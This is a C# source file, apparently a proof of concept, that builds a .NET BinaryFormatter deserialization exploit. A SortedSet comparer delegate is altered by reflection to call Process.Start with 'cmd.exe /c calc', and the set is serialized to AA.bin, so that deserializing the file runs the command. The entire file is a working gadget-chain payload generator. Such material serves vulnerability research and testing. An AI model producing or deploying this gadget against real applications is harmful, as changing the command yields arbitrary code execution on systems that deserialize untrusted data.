using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;

namespace SortedSetExample
{
    class Program
    {
        static void Main(string[] args)
        {
           

            Delegate da = new Comparison<string>(String.Compare);
            
            Comparison<string> mulitD = (Comparison<string>)MulticastDelegate.Combine(da, da);
           
            SortedSet<string> payload_Set = new SortedSet<string>(Comparer<string>.Create(mulitD));

            payload_Set.Add("/c calc");
            payload_Set.Add("cmd.exe");


            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] mulitD_list = mulitD.GetInvocationList();
            mulitD_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(mulitD, mulitD_list);

            BinaryFormatter formatter = new BinaryFormatter();
            using (FileStream stream = new FileStream("AA.bin", FileMode.Create, FileAccess.Write, FileShare.None))
            {
                formatter.Serialize(stream,payload_Set);
            }


            

        }
    }
}
